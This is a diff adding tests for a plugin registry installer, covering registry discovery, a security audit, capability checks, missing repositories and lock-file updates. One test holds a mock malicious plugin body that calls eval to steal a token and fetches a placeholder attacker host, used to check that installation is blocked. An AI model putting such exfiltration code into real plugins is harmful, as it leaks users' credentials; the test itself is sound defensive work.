@@ -816,6 +816,241 @@ describe('install', () => {
   })
 })
 
+/* ── author repository artifact chain & security audit (Group 5) ─────────── */
+
+describe('author repository artifact chain and security audit (Group 5)', () => {
+  it('discovers registry index entries via GitHub Contents API across 4 directories', async () => {
+    const musicItem = {
+      id: 'music-api-source',
+      kind: 'music-source',
+      name: 'API Music Source',
+      version: '1.0.0',
+      repoUrl: 'https://github.com/alice/music-source',
+    }
+    const lyricItem = {
+      id: 'lyric-api-source',
+      kind: 'lyric-source',
+      name: 'API Lyric Source',
+      version: '1.2.0',
+      repoUrl: 'https://github.com/bob/lyric-source',
+    }
+    const pluginItem = {
+      id: 'plugin-api',
+      kind: 'plugin',
+      name: 'API Plugin',
+      version: '2.0.0',
+      repoUrl: 'https://github.com/charlie/plugin',
+    }
+    const themeItem = {
+      id: 'theme-api',
+      kind: 'theme',
+      name: 'API Theme',
+      version: '1.0.0',
+      repoUrl: 'https://github.com/dave/theme',
+    }
+
+    const harness = await setupInitialized({
+      http: {
+        json: {
+          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/music-sources': [
+            { name: 'alice.json', type: 'file', download_url: 'https://cdn.example/music.json' },
+          ],
+          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/lyric-sources': [
+            { name: 'bob.json', type: 'file', download_url: 'https://cdn.example/lyric.json' },
+          ],
+          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/plugins': [
+            { name: 'charlie.json', type: 'file', download_url: 'https://cdn.example/plugin.json' },
+          ],
+          'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents/themes': [
+            { name: 'dave.json', type: 'file', download_url: 'https://cdn.example/theme.json' },
+          ],
+          'https://cdn.example/music.json': musicItem,
+          'https://cdn.example/lyric.json': lyricItem,
+          'https://cdn.example/plugin.json': pluginItem,
+          'https://cdn.example/theme.json': themeItem,
+        },
+      },
+    })
+
+    const index = await harness.plugin.getIndex(true)
+    expect(index.entries.length).toBe(4)
+    expect(index.entries.map((e) => e.id)).toEqual([
+      'music-api-source',
+      'lyric-api-source',
+      'plugin-api',
+      'theme-api',
+    ])
+  })
+
+  it('blocks installation when security audit discovers malicious code (eval + undeclared host)', async () => {
+    const harness = await setupInitialized({
+      http: {
+        json: {
+          'https://api.github.com/repos/evil-author/bad-plugin/commits/HEAD': {
+            sha: 'evil1234567890',
+          },
+          'https://raw.githubusercontent.com/evil-author/bad-plugin/evil1234567890/manifest.json': {
+            id: 'bad-plugin',
+            version: '1.0.0',
+            displayName: 'Bad Plugin',
+            entry: { main: './index.js' },
+            capabilities: ['net:host/*'],
+          },
+        },
+        bytes: {
+          'https://raw.githubusercontent.com/evil-author/bad-plugin/evil1234567890/index.js': new TextEncoder().encode(
+            'eval("stealToken()"); fetch("https://evil.ru/leak");',
+          ),
+        },
+      },
+    })
+
+    const entry = entryOf({
+      id: 'bad-plugin',
+      kind: 'plugin',
+      name: 'Bad Plugin',
+      repoUrl: 'https://github.com/evil-author/bad-plugin',
+      capabilities: ['net:host/*'],
+    })
+
+    await expect(harness.plugin.install(entry)).rejects.toThrow(/security audit blocked installation/)
+  })
+
+  it('rejects installation when plugin capabilities in manifest do not match registry metadata', async () => {
+    const harness = await setupInitialized({
+      http: {
+        json: {
+          'https://api.github.com/repos/mismatch-author/ext-plugin/commits/HEAD': {
+            sha: 'commit111',
+          },
+          'https://raw.githubusercontent.com/mismatch-author/ext-plugin/commit111/manifest.json': {
+            id: 'ext-plugin',
+            version: '1.0.0',
+            displayName: 'Ext Plugin',
+            entry: { main: './index.js' },
+            capabilities: ['net:host/*', 'device:bluetooth'],
+          },
+        },
+        bytes: {
+          'https://raw.githubusercontent.com/mismatch-author/ext-plugin/commit111/index.js': new TextEncoder().encode(
+            'export default function() {}',
+          ),
+        },
+      },
+    })
+
+    const entry = entryOf({
+      id: 'ext-plugin',
+      kind: 'plugin',
+      name: 'Ext Plugin',
+      repoUrl: 'https://github.com/mismatch-author/ext-plugin',
+      capabilities: ['net:host/*'],
+    })
+
+    await expect(harness.plugin.install(entry)).rejects.toThrow(
+      /capabilities mismatch between manifest and registry metadata/,
+    )
+  })
+
+  it('rejects with clear error when author repository is unreachable / 404', async () => {
+    const harness = await setupInitialized({
+      http: {
+        status: {
+          'https://api.github.com/repos/unknown-author/missing-repo/commits/HEAD': 404,
+          'https://api.github.com/repos/unknown-author/missing-repo': 404,
+        },
+      },
+    })
+
+    const entry = entryOf({
+      id: 'missing-plugin',
+      kind: 'plugin',
+      name: 'Missing Plugin',
+      repoUrl: 'https://github.com/unknown-author/missing-repo',
+    })
+
+    await expect(harness.plugin.install(entry)).rejects.toThrow(/failed to resolve author repository/)
+  })
+
+  it('records into registry.lock.json and updates lock record on commit advance', async () => {
+    let installedBundle: any
+    const httpSpec = {
+      json: {
+        'https://api.github.com/repos/good-author/safe-plugin/commits/HEAD': {
+          sha: 'commit-v1-sha',
+        },
+        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v1-sha/manifest.json': {
+          id: 'safe-plugin',
+          version: '1.0.0',
+          displayName: 'Safe Plugin',
+          entry: { main: './index.js' },
+          capabilities: ['audio:dsp'],
+        },
+        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v2-sha/manifest.json': {
+          id: 'safe-plugin',
+          version: '1.1.0',
+          displayName: 'Safe Plugin',
+          entry: { main: './index.js' },
+          capabilities: ['audio:dsp'],
+        },
+      },
+      bytes: {
+        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v1-sha/index.js': new TextEncoder().encode(
+          'export default function safePlugin() { return "v1"; }',
+        ),
+        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v2-sha/index.js': new TextEncoder().encode(
+          'export default function safePlugin() { return "v2"; }',
+        ),
+      },
+    }
+
+    const harness = await setupInitialized({ http: httpSpec })
+
+    harness.plugin.setPluginInstaller(async (bundle) => {
+      installedBundle = bundle
+    })
+
+    const entry = entryOf({
+      id: 'safe-plugin',
+      kind: 'plugin',
+      name: 'Safe Plugin',
+      repoUrl: 'https://github.com/good-author/safe-plugin',
+      capabilities: ['audio:dsp'],
+    })
+
+    // 1. Initial install
+    await harness.plugin.install(entry)
+    expect(installedBundle).toBeDefined()
+    expect(installedBundle.manifest.id).toBe('safe-plugin')
+
+    const lock1 = await harness.plugin.getLockRecord('safe-plugin')
+    expect(lock1).toBeDefined()
+    expect(lock1?.commit).toBe('commit-v1-sha')
+    expect(lock1?.kind).toBe('plugin')
+    expect(lock1?.sha256).toBe(sha256Hex('export default function safePlugin() { return "v1"; }'))
+
+    // 2. Fetch entry details surfaces commit
+    const details = await harness.plugin.fetchEntryDetails(entry)
+    expect(details.commit).toBe('commit-v1-sha')
+
+    // 3. Update with new commit
+    httpSpec.json['https://api.github.com/repos/good-author/safe-plugin/commits/HEAD'] = {
+      sha: 'commit-v2-sha',
+    }
+
+    const detailsV2 = await harness.plugin.fetchEntryDetails(entry)
+    expect(detailsV2.commitDiff).toEqual({
+      previousCommit: 'commit-v1-sha',
+      currentCommit: 'commit-v2-sha',
+    })
+
+    await harness.plugin.install(entry)
+    const lock2 = await harness.plugin.getLockRecord('safe-plugin')
+    expect(lock2?.commit).toBe('commit-v2-sha')
+    expect(lock2?.sha256).toBe(sha256Hex('export default function safePlugin() { return "v2"; }'))
+  })
+})
+
 /* ── the daily automatic check ───────────────────────────────────────────── */
 
 describe('automatic checks', () => {
